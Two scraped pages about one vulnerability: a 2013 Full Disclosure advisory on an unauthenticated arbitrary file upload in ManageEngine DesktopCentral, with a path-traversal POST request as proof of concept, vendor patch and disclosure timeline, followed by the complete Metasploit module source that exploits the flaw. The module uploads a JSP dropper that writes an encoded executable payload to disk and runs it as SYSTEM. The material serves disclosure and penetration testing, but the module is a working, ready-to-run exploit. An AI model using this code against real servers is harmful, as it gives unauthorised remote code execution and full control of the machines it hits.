=== Content from seclists.org_01ad7dab_20250125_232515.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](129)
[By Date](date.html#130)
[![Next](/images/right-icon-16x16.png)](131)

[![Previous](/images/left-icon-16x16.png)](129)
[By Thread](index.html#130)
[![Next](/images/right-icon-16x16.png)](131)

![](/shared/images/nst-icons.svg#search)

# DesktopCentral Arbitrary File Upload Vulnerability

---

*From*: Thomas Hibbert <Thomas.Hibbert () security-assessment com>

*Date*: Mon, 18 Nov 2013 03:32:03 +0000

---

```
(    , )     (,
  .   `.' ) ('.    ',
   ). , ('.   ( ) (
  (_,) .`), ) _ _,
 /  _____/  / _  \    ____  ____   _____
 \____  \==/ /_\  \ _/ ___\/  _ \ /     \
 /       \/   |    \\  \__(  <_> )  Y Y  \
/______  /\___|__  / \___  >____/|__|_|  /
        \/         \/.-.    \/         \/:wq
                    (x.0)
                  '=.|w|.='
                  _='`"``=.

                presents..

DesktopCentral Arbitrary File Upload Vulnerability
Affected versions: DesktopCentral versions < 80293

PDF: <http://security-assessment.com/files/documents/advisory/DesktopCentral%20Arbitrary%20File%20Upload.pdf>

+-----------+
|Description|
+-----------+

ManageEngine DesktopCentral 8.0.0 build 80293 and below suffer from an arbitrary file upload vulnerability that can be
leveraged to gain arbitrary code execution on the server. The code run on the server in this fashion will execute as
NT-AUTHORITY\SYSTEM.
The problem exists in the AgentLogUploadServlet. This servlet takes input from HTTP POST and constructs an output file
on the server without performing any sanitisation or even checking if the caller is authenticated. Due to the way the
path is constructed it is possible to traverse to the application web root and create a script file that will be
executed when called from a web browser.

+------------+
|Exploitation|
+------------+

POST/agentLogUploader?computerName=DesktopCentral&domainName=webapps&
customerId=..&filename=test.jsp HTTP/1.1
Host: <desktopcentral>:8020
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
Content-Type: text/html;
Content-Length: 109

<HTML>
 <HEAD>
  <TITLE>Hello World</TITLE>
 </HEAD>
 <BODY>
  <H1>Hello World</H1>
 </BODY>
</HTML>

+----------+
| Solution |
+----------+

Apply the patch supplied by the vendor (Patch 80293)

+-------------------+
|Disclosure Timeline|
+-------------------+

20/10/2013 – Vulnerability discovered, vendor notified.
25/10/2013 – Vendor acknowledges issue
30/10/2013 - Vendor issues Patch 80293 that fixes the issue
09/11/2013 – Exploit demonstrated at Kiwicon 7
18/11/2013 – Advisory released.

+-----------------------------+
|About Security-Assessment.com|
+-----------------------------+

Security-Assessment.com is a New Zealand based world
leader in web application testing, network security
and penetration testing. Security-Assessment.com
services organisations across New Zealand, Australia,
Asia Pacific, the United States and the United
Kingdom.

Security-Assessment.com is currently looking for skilled penetration
testers. If you are interested, please email 'hr at security-assessment.com'

```

**Attachment:
[PGP.sig](att-130/PGP_sig.bin)**

*Description:*

```
_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

[![Previous](/images/left-icon-16x16.png)](129)
[By Date](date.html#130)
[![Next](/images/right-icon-16x16.png)](131)

[![Previous](/images/left-icon-16x16.png)](129)
[By Thread](index.html#130)
[![Next](/images/right-icon-16x16.png)](131)

### Current thread:

* **DesktopCentral Arbitrary File Upload Vulnerability** *Thomas Hibbert (Nov 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_b114ddff_20250125_232516.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fwindows%2Fhttp%2Fdesktopcentral_file_upload.rb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fwindows%2Fhttp%2Fdesktopcentral_file_upload.rb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  412](/rapid7/metasploit-framework/issues)
* [Pull requests
  40](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

## Files

 master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[windows](/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
5. /[http](/rapid7/metasploit-framework/tree/master/modules/exploits/windows/http)
/
# desktopcentral\_file\_upload.rb

Copy path Blame  Blame
## Latest commit

## History

[History](/rapid7/metasploit-framework/commits/master/modules/exploits/windows/http/desktopcentral_file_upload.rb)176 lines (144 loc) · 5.29 KB master
## Breadcrumbs

1. [metasploit-framework](/rapid7/metasploit-framework/tree/master)
2. /[modules](/rapid7/metasploit-framework/tree/master/modules)
3. /[exploits](/rapid7/metasploit-framework/tree/master/modules/exploits)
4. /[windows](/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
5. /[http](/rapid7/metasploit-framework/tree/master/modules/exploits/windows/http)
/
# desktopcentral\_file\_upload.rb

Top
## File metadata and controls

* Code
* Blame

176 lines (144 loc) · 5.29 KB[Raw](https://github.com/rapid7/metasploit-framework/raw/refs/heads/master/modules/exploits/windows/http/desktopcentral_file_upload.rb)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##
class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking
 include Msf::Exploit::Remote::HttpClient include Msf::Exploit::EXE include Msf::Exploit::FileDropper
 def initialize(info = {}) super(update\_info(info, 'Name' => 'ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload', 'Description' => %q{ This module exploits an arbitrary file upload vulnerability in Desktop Central v7 to v8 build 80293. A malicious user can upload a JSP file into the web root without authentication, leading to arbitrary code execution as SYSTEM. }, 'Author' => [ 'Thomas Hibbert <thomas.hibbert[at]security-assessment.com>' # Vulnerability discovery and MSF module ], 'License' => MSF\_LICENSE, 'References' => [ ['CVE', '2013-7390'], ['OSVDB', '100008'], ['URL', 'http://security-assessment.com/files/documents/advisory/Desktop%20Central%20Arbitrary%20File%20Upload.pdf'], ['URL', 'https://seclists.org/fulldisclosure/2013/Nov/130'], ], 'Platform' => 'win', 'Arch' => ARCH\_X86, 'Targets' => [ [ 'Desktop Central v7 - v8 build 80292 / Windows', {} ] ], 'Privileged' => true, 'DefaultTarget' => 0, 'DisclosureDate' => '2013-11-11' ))
 register\_options([Opt::RPORT(8020)]) end
 def upload\_file(filename, contents) res = send\_request\_cgi({ 'uri' => normalize\_uri('agentLogUploader'), 'method' => 'POST', 'data' => contents, 'ctype' => 'text/html', 'encode\_params' => false, 'vars\_get' => { 'computerName' => 'DesktopCentral', 'domainName' => 'webapps', 'customerId' => '..', 'filename' => filename } })
 if res && res.code == 200 && res.body.to\_s.empty? return true else return false end end
 # Test for Desktop Central def check res = send\_request\_cgi({ 'uri' => normalize\_uri("configurations.do"), 'method' => 'GET' })
 if res && res.code == 200 build = nil
 if res.body.to\_s =~ /ManageEngine Desktop Central 7/ || res.body.to\_s =~ /ManageEngine Desktop Central MSP 7/ # DC v7
 print\_status("Detected Desktop Central v7") elsif res.body.to\_s =~ /ManageEngine Desktop Central 8/ || res.body.to\_s =~ /ManageEngine Desktop Central MSP 8/
 if res.body.to\_s =~ /id="buildNum" value="([0-9]+)"\/>/ # DC v8 (later versions) build = $1 print\_status("Detected Desktop Central v8 #{build}") else # DC v8 (earlier versions) print\_status("Detected Desktop Central v8") end elsif res.body.to\_s =~ /id="buildNum" value="([0-9]+)"\/>/ # DC v9 (and higher?) build = $1 end
 if build.nil? return Exploit::CheckCode::Unknown elsif Rex::Version.new(build) < Rex::Version.new("80293") return Exploit::CheckCode::Appears else return Exploit::CheckCode::Safe end end
 Exploit::CheckCode::Unknown end
 def exploit print\_status("Uploading JSP to execute the payload")
 exe = payload.encoded\_exe exe\_filename = rand\_text\_alpha\_lower(8) + ".exe"
 dropper = jsp\_drop\_and\_execute(exe, exe\_filename) dropper\_filename = rand\_text\_alpha\_lower(8) + ".jsp"
 if upload\_file(dropper\_filename, dropper) register\_files\_for\_cleanup(exe\_filename) register\_files\_for\_cleanup("..\\webapps\\DesktopCentral\\#{dropper\_filename}") else fail\_with(Failure::Unknown, "#{peer} - JSP upload failed") end
 print\_status("Executing payload") send\_request\_cgi( { 'uri' => normalize\_uri(dropper\_filename), 'method' => 'GET' }) end
 def jsp\_drop\_bin(bin\_data, output\_file) jspraw = %Q|<%@ page import="java.io.\*" %>\n| jspraw << %Q|<%\n| jspraw << %Q|String data = "#{Rex::Text.to\_hex(bin\_data, "")}";\n|
 jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output\_file}");\n|
 jspraw << %Q|int numbytes = data.length();\n|
 jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n| jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n| jspraw << %Q|{\n| jspraw << %Q| char char1 = (char) data.charAt(counter);\n| jspraw << %Q| char char2 = (char) data.charAt(counter + 1);\n| jspraw << %Q| int comb = Character.digit(char1, 16) & 0xff;\n| jspraw << %Q| comb <<= 4;\n| jspraw << %Q| comb += Character.digit(char2, 16) & 0xff;\n| jspraw << %Q| bytes[counter/2] = (byte)comb;\n| jspraw << %Q|}\n|
 jspraw << %Q|outputstream.write(bytes);\n| jspraw << %Q|outputstream.close();\n| jspraw << %Q|%>\n|
 jspraw end
 def jsp\_execute\_command(command) jspraw = %Q|\n| jspraw << %Q|<%\n| jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n| jspraw << %Q|%>\n|
 jspraw end
 def jsp\_drop\_and\_execute(bin\_data, output\_file) jsp\_drop\_bin(bin\_data, output\_file) + jsp\_execute\_command(output\_file) endend

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


